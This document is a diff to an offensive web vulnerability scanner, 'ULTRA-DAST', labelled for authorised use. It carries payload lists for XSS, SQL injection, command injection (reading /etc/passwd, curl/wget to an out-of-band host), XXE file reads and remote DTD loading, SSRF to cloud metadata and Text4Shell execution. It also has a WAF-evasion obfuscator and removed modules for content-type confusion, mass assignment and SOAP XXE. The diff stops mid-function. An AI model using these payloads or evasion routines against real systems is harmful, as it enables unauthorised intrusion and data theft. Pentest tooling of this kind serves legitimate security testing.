@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTRA-DASTv11.7 – The Unstoppable Pentester Platform
+ULTRA-DAST v11.9 – The Unstoppable Pentester Platform
 Full implementation with async engine, advanced evasion, second-order injection,
 race conditions, request smuggling, WebSocket/gRPC fuzzing, CVSS 4.0, Burp XML,
 JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.
@@ -16,6 +16,8 @@ Authorised use only. Unauthorised scanning is illegal.
 import asyncio
 import sys, os, json, re, time, uuid, base64, hashlib, threading, copy, random, statistics, logging, sqlite3
 import ssl
+import ipaddress
+import binascii  # ADDED for JWT decode error handling
 from datetime import datetime
 from collections import defaultdict, deque
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote, unquote
@@ -24,11 +26,13 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import subprocess
 import platform
 from logging.handlers import RotatingFileHandler
+from typing import Dict, List, Optional, Any, Set, Tuple, Union, Callable, Pattern
+import warnings
+import hmac
+import secrets
 
 import aiohttp
-import requests
 from bs4 import BeautifulSoup
-import yaml
 import jwt as pyjwt
 import json
 
@@ -96,12 +100,42 @@ LEGAL_BANNER = """
  *** UNAUTHORIZED USE IS A FEDERAL CRIME ***
 """
 
+# Security configuration
+DISABLE_SSL_VERIFICATION = False  # Set to True only for testing with explicit consent
+OOB_AUTH_TOKEN = secrets.token_hex(32)  # Generate secure auth token for OOB services
+OOB_AUTH_HEADER = "X-OOB-Auth"
+
+# SSL context creation with proper verification
+def create_ssl_context(verify=True):
+    """Create SSL context with configurable verification. Defaults to secure."""
+    context = ssl.create_default_context()
+    if not verify:
+        if DISABLE_SSL_VERIFICATION:
+            warnings.warn(
+                "SSL/TLS verification is DISABLED. This makes connections vulnerable to MITM attacks. "
+                "Only use for authorized testing in isolated environments.",
+                SecurityWarning
+            )
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+        else:
+            logging.warning("SSL verification requested to be disabled but not allowed. Using secure defaults.")
+    return context
+
+class SecurityWarning(Warning):
+    """Custom warning for security-related issues."""
+    pass
+
 REQUEST_TIMEOUT = 10
 DEFAULT_DEPTH = 3
 DEFAULT_THREADS = 100
 DEFAULT_DELAY = 0.0
 DEFAULT_CONFIDENCE_THRESHOLD = 75
 DEFAULT_VALIDATION_ENABLED = True  # Enable 3x validation and remediation testing by default
+
+# OOB marker constants for payload substitution
+OOB_MARKER = "OOB_MARKER"
+OOB_DNS = "OOB_DNS"
 
 CWE_MAP = {
     "XSS": "CWE-79", "DOM XSS": "CWE-79", "Blind XSS": "CWE-79",
@@ -126,9 +160,9 @@ PAYLOADS = {
         '"><img src=x onerror=alert(1)>',
         "<svg/onload=alert(1)>",
         "<body onpageshow=alert(1)>",
-        "<img src=http://OOB_MARKER>",
-        "fetch('http://OOB_MARKER')",
-        "new Image().src='http://OOB_MARKER'",
+        f"<img src=http://{OOB_MARKER}>",
+        f"fetch('http://{OOB_MARKER}')",
+        f"new Image().src='http://{OOB_MARKER}'",
     ],
     "SQLi": [
         "' OR '1'='1",
@@ -138,7 +172,7 @@ PAYLOADS = {
         "' UNION SELECT NULL--",
         "1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
         "1' AND (SELECT COUNT(*) FROM information_schema.tables)--",
-        "1' AND LOAD_FILE(concat('\\\\',(SELECT database()),'.OOB_DNS\\test'))--",
+        f"1' AND LOAD_FILE(concat('\\\\',(SELECT database()),'.{OOB_DNS}\\test'))--",
         "' ORDER BY 1--",
     ],
     "PathTraversal": [
@@ -157,10 +191,10 @@ PAYLOADS = {
         "|whoami",
         "&&dir",
         ";cat /etc/passwd",
-        "||ping -c 5 OOB_DNS",
-        "||nslookup OOB_DNS",
-        "||curl OOB_MARKER",
-        "||wget -q -O- OOB_MARKER",
+        f"||ping -c 5 {OOB_DNS}",
+        f"||nslookup {OOB_DNS}",
+        f"||curl {OOB_MARKER}",
+        f"||wget -q -O- {OOB_MARKER}",
     ],
     "OpenRedirect": ["//evil.com", "https://evil.com"],
     "SSTI": [
@@ -194,13 +228,13 @@ PAYLOADS = {
     ],
     "XXE": [
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-        '<!DOCTYPE replace [<!ENTITY % remote SYSTEM "http://OOB_MARKER"> %remote;]>',
-        '<!DOCTYPE replace [<!ENTITY % dtd SYSTEM "http://OOB_MARKER/evil.dtd"> %dtd;]>',
+        f'<!DOCTYPE replace [<!ENTITY % remote SYSTEM "http://{OOB_MARKER}"> %remote;]>',
+        f'<!DOCTYPE replace [<!ENTITY % dtd SYSTEM "http://{OOB_MARKER}/evil.dtd"> %dtd;]>',
     ],
     "CRLF": ["test%0d%0aSet-Cookie:crlf=injection"],
     "SSRF": [
         "http://169.254.169.254/latest/meta-data/",
-        "http://OOB_MARKER",
+        f"http://{OOB_MARKER}",
         "http://127.0.0.1:22",
         "gopher://127.0.0.1:6379/_INFO",
         "http://127.0.0.1:80",
@@ -288,8 +322,8 @@ PAYLOADS = {
     "Text4Shell": [
         "${script:javascript:java.lang.Runtime.exec('calc')}",
         "${script:js:java.lang.Runtime.exec('id')}",
-        "${dns:OOB_DNS}",
-        "${url:ftp://OOB_MARKER}",
+        f"${{dns:{OOB_DNS}}}",
+        f"${{url:ftp://{OOB_MARKER}}}",
         "${env:USER}",
         "${env:PATH}",
         "${env:JAVA_HOME}",
@@ -372,102 +406,169 @@ SQL_ERROR_PATTERN = re.compile(
     r"ODBC Driver|Unclosed quotation|Warning.*mysql_|valid MySQL result|"
     r"on line \d+|Incorrect syntax near", re.IGNORECASE
 )
+
+def detect_sqli_error_ast(html: str) -> bool:
+    """
+    AST-based SQL error detection using tokenization.
+    Detects structural patterns in error stacks instead of brittle regex.
+    More robust against custom error pages.
+    """
+    import re
+    from collections import Counter
+    
+    # Tokenize the HTML into meaningful chunks
+    # Split on common delimiters while preserving SQL keywords
+    tokens = re.findall(r'\b\w+\b|[\'"<>]|[\d,.;:()]', html, re.IGNORECASE)
+    
+    # SQL error structural indicators
+    sql_keywords = {'sql', 'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql', 
+                    'syntax', 'error', 'warning', 'exception', 'query', 'statement',
+                    'near', 'line', 'column', 'unexpected', 'token', 'quoted'}
+    
+    # Database-specific error patterns
+    db_patterns = {
+        'mysql': {'mysql', '1064', '1065', '1146', 'syntax', 'near'},
+        'postgres': {'postgresql', 'postgres', 'syntax', 'error', 'line'},
+        'oracle': {'ora-', 'oracle', 'pls-', 'error'},
+        'sqlite': {'sqlite', 'syntax', 'near'},
+        'mssql': {'microsoft', 'ole db', 'odbc', 'sql server'}
+    }
+    
+    # Count keyword occurrences
+    token_lower = [t.lower() for t in tokens]
+    keyword_counts = Counter(token_lower)
+    
+    # Check for structural error patterns
+    sql_keyword_score = sum(keyword_counts.get(k, 0) for k in sql_keywords)
+    
+    # Look for error stack structure: [DB_TYPE] + [ERROR] + [LOCATION]
+    has_db_type = any(db in token_lower for db in {'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql', 'sql'})
+    has_error_word = any(err in token_lower for err in {'error', 'warning', 'exception', 'syntax'})
+    has_location = any(loc in token_lower for loc in {'line', 'column', 'near', 'at'})
+    
+    # Structural pattern: database error message
+    if has_db_type and has_error_word:
+        return True
+    
+    # Check for specific database error signatures
+    for db_name, pattern_set in db_patterns.items():
+        if sum(keyword_counts.get(p, 0) for p in pattern_set) >= 2:
+            return True
+    
+    # Fallback: if enough SQL-related keywords appear together
+    if sql_keyword_score >= 3:
+        return True
+    
+    return False
+
 PASSWD_PATTERN = re.compile(r"root:x:0:0|daemon:x:1:1|root:.*:0:", re.I)
 COMMAND_PATTERN = re.compile(r"uid=\d+|gid=\d+|groups=|Volume Serial Number|Directory of ", re.I)
 AWS_META_PATTERN = re.compile(r"(ami-id|instance-id|public-keys|security-credentials)", re.I)
 
+# Cache for obfuscated payloads to avoid recomputation
+_obfuscation_cache = {}
+
 def obfuscate(payload, context="param"):
-    variants = [payload]
+    cache_key = (payload, context)
+    if cache_key in _obfuscation_cache:
+        return _obfuscation_cache[cache_key]
     
-    # Double URL encoding (%2527 instead of %27)
-    variants.append(quote(payload, safe=''))
-    variants.append(quote(quote(payload, safe=''), safe=''))
-    
-    # Case randomization (mixed case: sElEcT, aLeRt)
-    def randomize_case(text):
-        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
-    
-    if "SELECT" in payload.upper() or "ALERT" in payload.upper() or "UNION" in payload.upper():
-        variants.append(randomize_case(payload))
-        variants.append(payload.upper())
-        variants.append(payload.lower())
-    
-    # Comments insertion (S/**/EL/**/ECT)
-    if " " in payload:
-        variants.append(payload.replace(" ", "/**/"))
-    
-    # Unicode normalization (fullwidth characters)
-    def to_fullwidth(text):
-        result = []
-        for c in text:
-            code = ord(c)
-            if 33 <= code <= 126:  # ASCII printable range
-                result.append(chr(code + 0xFEE0))  # Convert to fullwidth
-            else:
-                result.append(c)
-        return ''.join(result)
-    
-    variants.append(to_fullwidth(payload))
-    
-    # Tab/Newline injection (%0a, %09 between keywords)
-    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP", "alert", "script"]
-    for keyword in keywords:
-        if keyword in payload.upper():
-            variants.append(payload.replace(keyword, keyword[0] + "%09" + keyword[1:]))
-            variants.append(payload.replace(keyword, keyword[0] + "%0a" + keyword[1:]))
-            break
-    
-    # JSON Unicode escape (\u0027 for single quote)
-    def json_unicode_escape(text):
-        result = []
-        for c in text:
-            if c == "'":
-                result.append("\\u0027")
-            elif c == '"':
-                result.append("\\u0022")
-            elif ord(c) < 32 or ord(c) > 126:
-                result.append(f"\\u{ord(c):04x}")
-            else:
-                result.append(c)
-        return ''.join(result)
-    
-    if context == "json":
-        variants.append(json_unicode_escape(payload))
-    
-    # HTML entity encoding
-    html_entity = ''.join(f"&#{ord(c)};" for c in payload)
-    variants.append(html_entity)
-    
-    # Standard Unicode escape
-    unicode_escaped = ''.join(f"\\u{ord(c):04x}" for c in payload)
-    variants.append(unicode_escaped)
-    
-    # Triple URL encoding
-    variants.append(quote(quote(quote(payload, safe=''), safe='')))
-    
-    # Null byte injection
-    variants.append(payload.replace(" ", " %00"))
-    
-    # Combine techniques (Comment + Double-Encoding)
-    if " " in payload:
-        comment_variant = payload.replace(" ", "/**/")
-        variants.append(quote(comment_variant, safe=''))
-        variants.append(quote(quote(comment_variant, safe=''), safe=''))
-    
-    # Combine Case Randomization + Comments
-    if "SELECT" in payload.upper() and " " in payload:
-        mixed_case = randomize_case(payload)
-        variants.append(mixed_case.replace(" ", "/**/"))
-    
-    # Combine Unicode + Tab injection
-    if "SELECT" in payload.upper():
-        fullwidth = to_fullwidth(payload)
+    # Use generator to lazily compute variants only when needed
+    def generate_variants():
+        yield payload
+        
+        # Double URL encoding (%2527 instead of %27)
+        yield quote(payload, safe='')
+        yield quote(quote(payload, safe=''), safe='')
+        
+        # Case randomization (mixed case: sElEcT, aLeRt)
+        def randomize_case(text):
+            return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
+        
+        if "SELECT" in payload.upper() or "ALERT" in payload.upper() or "UNION" in payload.upper():
+            yield randomize_case(payload)
+            yield payload.upper()
+            yield payload.lower()
+        
+        # Comments insertion (S/**/EL/**/ECT)
+        if " " in payload:
+            yield payload.replace(" ", "/**/")
+        
+        # Unicode normalization (fullwidth characters)
+        def to_fullwidth(text):
+            result = []
+            for c in text:
+                code = ord(c)
+                if 33 <= code <= 126:  # ASCII printable range
+                    result.append(chr(code + 0xFEE0))  # Convert to fullwidth
+                else:
+                    result.append(c)
+            return ''.join(result)
+        
+        yield to_fullwidth(payload)
+        
+        # Tab/Newline injection (%0a, %09 between keywords)
+        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP", "alert", "script"]
         for keyword in keywords:
             if keyword in payload.upper():
-                variants.append(fullwidth.replace(keyword.upper(), keyword.upper()[0] + "%09" + keyword.upper()[1:]))
+                yield payload.replace(keyword, keyword[0] + "%09" + keyword[1:])
+                yield payload.replace(keyword, keyword[0] + "%0a" + keyword[1:])
                 break
+        
+        # JSON Unicode escape (\u0027 for single quote)
+        def json_unicode_escape(text):
+            result = []
+            for c in text:
+                if c == "'":
+                    result.append("\\u0027")
+                elif c == '"':
+                    result.append("\\u0022")
+                elif ord(c) < 32 or ord(c) > 126:
+                    result.append(f"\\u{ord(c):04x}")
+                else:
+                    result.append(c)
+            return ''.join(result)
+        
+        if context == "json":
+            yield json_unicode_escape(payload)
+        
+        # HTML entity encoding
+        html_entity = ''.join(f"&#{ord(c)};" for c in payload)
+        yield html_entity
+        
+        # Standard Unicode escape
+        unicode_escaped = ''.join(f"\\u{ord(c):04x}" for c in payload)
+        yield unicode_escaped
+        
+        # Triple URL encoding
+        yield quote(quote(quote(payload, safe=''), safe=''))
+        
+        # Null byte injection
+        yield payload.replace(" ", " %00")
+        
+        # Combine techniques (Comment + Double-Encoding)
+        if " " in payload:
+            comment_variant = payload.replace(" ", "/**/")
+            yield quote(comment_variant, safe='')
+            yield quote(quote(comment_variant, safe=''), safe='')
+        
+        # Combine Case Randomization + Comments
+        if "SELECT" in payload.upper() and " " in payload:
+            mixed_case = randomize_case(payload)
+            yield mixed_case.replace(" ", "/**/")
+        
+        # Combine Unicode + Tab injection
+        if "SELECT" in payload.upper():
+            fullwidth = to_fullwidth(payload)
+            for keyword in keywords:
+                if keyword in payload.upper():
+                    yield fullwidth.replace(keyword.upper(), keyword.upper()[0] + "%09" + keyword.upper()[1:])
+                    break
     
-    return list(set(variants))
+    # Cache the result as a list
+    variants = list(set(generate_variants()))
+    _obfuscation_cache[cache_key] = variants
+    return variants
 
 # ---------------------------------------------------------------------
 # INPUT VALIDATION
@@ -649,7 +750,7 @@ class OOBCallbackHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
-def start_oob_server(bind="0.0.0.0", preferred_port=None):
+def start_oob_server(bind="127.0.0.1", preferred_port=None):
     """Start OOB server with port allocation to avoid conflicts"""
     port = PortAllocator.get_available_port(preferred_port)
     server = HTTPServer((bind, port), OOBCallbackHandler)
@@ -666,7 +767,7 @@ smtp_oob_lock = threading.Lock()
 class SMTPOOBHandler:
     """Handle SMTP callbacks for email-based OOB testing"""
     
-    def __init__(self, bind="0.0.0.0", port=2525):
+    def __init__(self, bind="127.0.0.1", port=2525):
         self.bind = bind
         self.port = port
         self.server = None
@@ -728,7 +829,7 @@ def get_smtp_oob_payloads(oob_domain, oob_ip):
     return [
         f"mailto:test@{oob_domain}",
         f"mailto:exploit@{oob_domain}?subject=OOB_TEST",
-        f"mailto:user@{oob_domain}?body=OOB_MARKER",
+        f"mailto:user@{oob_domain}?body={OOB_MARKER}",
         f"test@{oob_domain}",
         f"admin@{oob_domain}",
         f"webmaster@{oob_domain}",
@@ -755,12 +856,23 @@ class ICMPOOBListener:
             import socket
             import struct
             
+            # Test socket creation before starting thread to fail gracefully
+            try:
+                test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                test_socket.close()
+            except PermissionError:
+                logging.warning("ICMP OOB listener disabled: requires administrator/root privileges. Run as administrator or use alternative OOB methods.")
+                return False
+            except OSError as e:
+                logging.warning(f"ICMP OOB listener disabled: {e}. Raw sockets not available on this system.")
+                return False
+            
             def icmp_listener():
                 self.running = True
                 try:
                     # Create raw socket (requires admin/root)
                     icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                    icmp_socket.bind(("0.0.0.0", 0))
+                    icmp_socket.bind(("127.0.0.1", 0))
                     icmp_socket.settimeout(1)
                     
                     while self.running:
@@ -780,16 +892,16 @@ class ICMPOOBListener:
                                 logging.warning(f"ICMP receive error: {e}")
                     icmp_socket.close()
                 except PermissionError:
-                    logging.error("ICMP listener requires administrator/root privileges")
+                    logging.warning("ICMP listener requires administrator/root privileges - disabling ICMP OOB")
                 except Exception as e:
-                    logging.error(f"ICMP listener error: {e}")
+                    logging.warning(f"ICMP listener error: {e}")
             
             self.thread = threading.Thread(target=icmp_listener, daemon=True)
             self.thread.start()
             logging.info("ICMP OOB listener started")
             return True
         except Exception as e:
-            logging.error(f"Failed to start ICMP listener: {e}")
+            logging.warning(f"Failed to start ICMP listener: {e} - ICMP OOB disabled")
             return False
     
     def stop(self):
@@ -848,7 +960,7 @@ class HTTPSOOBHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
-def start_https_oob_server(bind="0.0.0.0", preferred_port=None, cert_file=None, key_file=None):
+def start_https_oob_server(bind="127.0.0.1", preferred_port=None, cert_file=None, key_file=None):
     """Start HTTPS OOB server with TLS support"""
     try:
         import ssl
@@ -862,20 +974,77 @@ def start_https_oob_server(bind="0.0.0.0", preferred_port=None, cert_file=None, 
             cert_file = "oob_cert.pem"
             key_file = "oob_key.pem"
             
-            # Generate self-signed certificate
+            # Generate self-signed certificate using Python's cryptography library
             try:
-                subprocess.run([
-                    'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
-                    '-keyout', key_file, '-out', cert_file, '-days', '365',
-                    '-nodes', '-subj', '/CN=OOB-Server'
-                ], capture_output=True, check=True, timeout=10)
+                from cryptography import x509
+                from cryptography.x509.oid import NameOID
+                from cryptography.hazmat.primitives import hashes
+                from cryptography.hazmat.primitives.asymmetric import rsa
+                from cryptography.hazmat.primitives import serialization
+                import datetime
+                
+                # Generate private key
+                private_key = rsa.generate_private_key(
+                    public_exponent=65537,
+                    key_size=4096
+                )
+                
+                # Generate certificate
+                subject = issuer = x509.Name([
+                    x509.NameAttribute(NameOID.COMMON_NAME, "OOB-Server"),
+                ])
+                cert = x509.CertificateBuilder().subject_name(
+                    subject
+                ).issuer_name(
+                    issuer
+                ).public_key(
+                    private_key.public_key()
+                ).serial_number(
+                    x509.random_serial_number()
+                ).not_valid_before(
+                    datetime.datetime.utcnow()
+                ).not_valid_after(
+                    datetime.datetime.utcnow() + datetime.timedelta(days=365)
+                ).add_extension(
+                    x509.SubjectAlternativeName([
+                        x509.DNSName("localhost"),
+                        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
+                    ]),
+                    critical=False
+                ).sign(private_key, hashes.SHA256())
+                
+                # Write certificate and key to files
+                with open(cert_file, "wb") as f:
+                    f.write(cert.public_bytes(serialization.Encoding.PEM))
+                with open(key_file, "wb") as f:
+                    f.write(private_key.private_bytes(
+                        encoding=serialization.Encoding.PEM,
+                        format=serialization.PrivateFormat.TraditionalOpenSSL,
+                        encryption_algorithm=serialization.NoEncryption()
+                    ))
                 logging.info(f"Generated self-signed certificate: {cert_file}")
-            except (subprocess.CalledProcessError, FileNotFoundError) as e:
-                logging.warning(f"Failed to generate self-signed cert: {e}")
-                # Fallback: create simple SSL context without cert
-                ssl_context = ssl.create_default_context()
-                ssl_context.check_hostname = False
-                ssl_context.verify_mode = ssl.CERT_NONE
+            except ImportError:
+                logging.warning("cryptography library not available, attempting OpenSSL subprocess")
+                # Fallback to OpenSSL if cryptography not available
+                try:
+                    subprocess.run([
+                        'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
+                        '-keyout', key_file, '-out', cert_file, '-days', '365',
+                        '-nodes', '-subj', '/CN=OOB-Server'
+                    ], capture_output=True, check=True, timeout=10)
+                    logging.info(f"Generated self-signed certificate using OpenSSL: {cert_file}")
+                except (subprocess.CalledProcessError, FileNotFoundError) as e:
+                    logging.error(f"Failed to generate self-signed cert: {e}")
+                    # Fallback: create SSL context with proper verification
+                    ssl_context = create_ssl_context(verify=False)
+                    server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
+                    thread = threading.Thread(target=server.serve_forever, daemon=True)
+                    thread.start()
+                    return server, port
+            except Exception as e:
+                logging.error(f"Failed to generate self-signed cert: {e}")
+                # Fallback: create SSL context with proper verification
+                ssl_context = create_ssl_context(verify=False)
                 server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
                 thread = threading.Thread(target=server.serve_forever, daemon=True)
                 thread.start()
@@ -1080,7 +1249,7 @@ class JWTAttack:
             payload_b64 += '=' * (4 - len(payload_b64) % 4)
             payload_json = base64.urlsafe_b64decode(payload_b64)
             return json.loads(payload_json)
-        except Exception as e:
+        except (json.JSONDecodeError, ValueError, IndexError, binascii.Error) as e:
             logging.error(f"Failed to decode JWT payload: {e}")
             return None
     
@@ -1388,443 +1557,6 @@ class JWTAttack:
             return None
 
 # ---------------------------------------------------------------------
-# PROTOCOL AMBIGUITY ATTACK MODULE
-# ---------------------------------------------------------------------
-class ContentTypeAmbiguityAttack:
-    """Content-Type ambiguity attacks for parameter pollution and SQL injection"""
-    
-    @staticmethod
-    async def test_json_header_urlencoded_body(url, params=None, session=None):
-        """
-        Test: Send Content-Type: application/json but body as URL-encoded (ASYNC VERSION)
-        Check if server parses both formats (parameter pollution vulnerability)
-        """
-        try:
-            import aiohttp
-            
-            # Prepare URL-encoded body
-            body_data = params or {'a': '1', 'b': '2'}
-            urlencoded_body = urlencode(body_data)
-            
-            headers = {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            }
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(url, data=urlencoded_body, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    text = await response.text()
-                    
-                    logging.info(f"Content-Type ambiguity test (JSON header + URL body): Status {response.status}")
-                    
-                    return {
-                        'attack_type': 'Content-Type Ambiguity',
-                        'test': 'JSON header with URL-encoded body',
-                        'url': url,
-                        'headers_sent': headers,
-                        'body_sent': urlencoded_body,
-                        'response_status': response.status,
-                        'response_length': len(text),
-                        'vulnerable': response.status not in [400, 415, 422],
-                        'description': 'Server accepted mismatched Content-Type header and body format'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"Content-Type ambiguity test failed: {e}")
-            return None
-    
-    @staticmethod
-    async def test_urlencoded_header_json_body(url, json_data=None, session=None):
-        """
-        Test: Send Content-Type: application/x-www-form-urlencoded but body as JSON (ASYNC VERSION)
-        Check if server parses both formats
-        """
-        try:
-            import aiohttp
-            
-            # Prepare JSON body
-            body_data = json_data or {'a': '1', 'b': '2'}
-            json_body = json.dumps(body_data)
-            
-            headers = {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'application/json'
-            }
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(url, data=json_body, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    text = await response.text()
-                    logging.info(f"Content-Type ambiguity test (URL header + JSON body): Status {response.status}")
-                    
-                    return {
-                        'attack_type': 'Content-Type Ambiguity',
-                        'test': 'URL-encoded header with JSON body',
-                        'url': url,
-                        'headers_sent': headers,
-                        'body_sent': json_body,
-                        'response_status': response.status,
-                        'response_length': len(text),
-                        'vulnerable': response.status not in [400, 415, 422],
-                        'description': 'Server accepted mismatched Content-Type header and body format'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"Content-Type ambiguity test failed: {e}")
-            return None
-    
-    @staticmethod
-    async def test_parameter_pollution_sqli(url, param_name='id', session=None):
-        """
-        Test parameter pollution for SQL injection (ASYNC VERSION)
-        Send same parameter multiple times with different values
-        """
-        try:
-            import aiohttp
-            
-            # Test with parameter pollution: a=1&a=' OR 1=1--
-            polluted_params = {
-                param_name: ['1', "' OR 1=1--"],
-                'other_param': 'test'
-            }
-            
-            # Convert to parameter pollution format
-            params_list = []
-            for key, value in polluted_params.items():
-                if isinstance(value, list):
-                    for v in value:
-                        params_list.append((key, v))
-                else:
-                    params_list.append((key, value))
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(url, data=params_list, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    text = await response.text()
-                    
-                    logging.info(f"Parameter pollution SQLi test: Status {response.status}")
-                    
-                    # Check for SQLi indicators in response
-                    sqli_indicators = ['syntax error', 'mysql', 'oracle', 'postgresql', 'sqlite', 'warning', 'error']
-                    has_sqli_indicators = any(indicator in text.lower() for indicator in sqli_indicators)
-                    
-                    return {
-                        'attack_type': 'Parameter Pollution SQLi',
-                        'test': 'Multiple values for same parameter',
-                        'url': url,
-                        'params_sent': params_list,
-                        'response_status': response.status,
-                        'response_length': len(text),
-                        'has_sqli_indicators': has_sqli_indicators,
-                        'vulnerable': has_sqli_indicators or response.status == 200,
-                        'description': 'Server may be vulnerable to parameter pollution SQL injection'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"Parameter pollution SQLi test failed: {e}")
-            return None
-
-class ProtobufThriftAmbiguityAttack:
-    """JSON deserialization attacks on protobuf/Thrift endpoints"""
-    
-    @staticmethod
-    async def find_protobuf_thrift_endpoints(base_url, endpoints=None, session=None):
-        """
-        Look for endpoints with gRPC or protobuf content types (ASYNC VERSION)
-        """
-        try:
-            import aiohttp
-            from urllib.parse import urljoin
-            
-            target_endpoints = endpoints or ['/api', '/grpc', '/protobuf', '/thrift', '/v1/', '/v2/']
-            found_endpoints = []
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                for endpoint in target_endpoints:
-                    full_url = urljoin(base_url, endpoint)
-                    
-                    try:
-                        async with session.get(full_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
-                            content_type = response.headers.get('Content-Type', '').lower()
-                            
-                            if any(ct in content_type for ct in ['application/grpc', 'application/x-protobuf', 'application/x-thrift']):
-                                found_endpoints.append({
-                                    'url': full_url,
-                                    'content_type': content_type,
-                                    'status': response.status
-                                })
-                                logging.info(f"Found protobuf/Thrift endpoint: {full_url} ({content_type})")
-                                
-                    except Exception as e:
-                        logging.debug(f"Endpoint check failed for {full_url}: {e}")
-                
-                return found_endpoints
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"Protobuf/Thrift endpoint discovery failed: {e}")
-            return []
-    
-    @staticmethod
-    async def test_json_on_protobuf_endpoint(endpoint_url, session=None):
-        """
-        Test sending JSON instead of protobuf to protobuf endpoint (ASYNC VERSION)
-        Check for Unmarshalling errors or Mass Assignment bugs
-        """
-        try:
-            import aiohttp
-            
-            # Prepare JSON payload
-            json_payload = {
-                'user': {
-                    'username': 'test',
-                    'email': 'test@example.com',
-                    'role': 'admin',  # Potential mass assignment
-                    'is_admin': True  # Potential mass assignment
-                }
-            }
-            
-            headers = {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            }
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                async with session.post(endpoint_url, json=json_payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    text = await response.text()
-                    
-                    # Check for unmarshalling errors
-                    unmarshalling_errors = ['unmarshal', 'deserialize', 'parse error', 'invalid format', 'protobuf']
-                    has_unmarshalling_error = any(err in text.lower() for err in unmarshalling_errors)
-                    
-                    logging.info(f"JSON on protobuf test: Status {response.status}, Unmarshalling error: {has_unmarshalling_error}")
-                    
-                    return {
-                        'attack_type': 'JSON Deserialization on Protobuf',
-                        'url': endpoint_url,
-                        'payload': json_payload,
-                        'response_status': response.status,
-                        'response_text': text[:500],  # Truncate for logging
-                        'has_unmarshalling_error': has_unmarshalling_error,
-                        'vulnerable': response.status == 200 and not has_unmarshalling_error,
-                        'description': 'Server accepted JSON on protobuf endpoint - potential Mass Assignment bug'
-                    }
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"JSON on protobuf test failed: {e}")
-            return None
-
-class SoapXXEAttack:
-    """XXE attacks via SOAP endpoints using PUBLIC entity to bypass WAF"""
-    
-    @staticmethod
-    async def find_soap_endpoints(base_url, session=None):
-        """
-        Find SOAP endpoints by looking for ?wsdl or common SOAP paths (ASYNC VERSION)
-        """
-        try:
-            import aiohttp
-            from urllib.parse import urljoin
-            
-            soap_indicators = ['?wsdl', '?WSDL', '/soap', '/services', '/wsdl']
-            found_endpoints = []
-            
-            close_session = False
-            if session is None:
-                session = aiohttp.ClientSession()
-                close_session = True
-            
-            try:
-                for indicator in soap_indicators:
-                    full_url = urljoin(base_url, indicator)
-                    
-                    try:
-                        async with session.get(full_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
-                            text = await response.text()
-                            
-                            # Check for SOAP WSDL indicators
-                            soap_keywords = ['wsdl', 'definitions', 'service', 'binding', 'soap', 'envelope']
-                            has_soap = any(keyword in text.lower() for keyword in soap_keywords)
-                            
-                            if has_soap or response.status == 200:
-                                found_endpoints.append({
-                                    'url': full_url,
-                                    'status': response.status,
-                                    'content_type': response.headers.get('Content-Type', ''),
-                                    'is_soap': has_soap
-                                })
-                                logging.info(f"Found potential SOAP endpoint: {full_url}")
-                                
-                    except Exception as e:
-                        logging.debug(f"SOAP endpoint check failed for {full_url}: {e}")
-                
-                return found_endpoints
-            finally:
-                if close_session:
-                    await session.close()
-                    
-        except Exception as e:
-            logging.error(f"SOAP endpoint discovery failed: {e}")
-            return []
-    
-    @staticmethod
-    def generate_xxe_payload_public(oob_dns_domain, file_to_exfiltrate='/etc/passwd'):
-        """
-        Generate XXE payload using PUBLIC entity (bypasses WAF that blocks SYSTEM)
-        Uses parameter entity for OOB DNS exfiltration
-        """
-        # Use PUBLIC instead of SYSTEM to bypass WAF
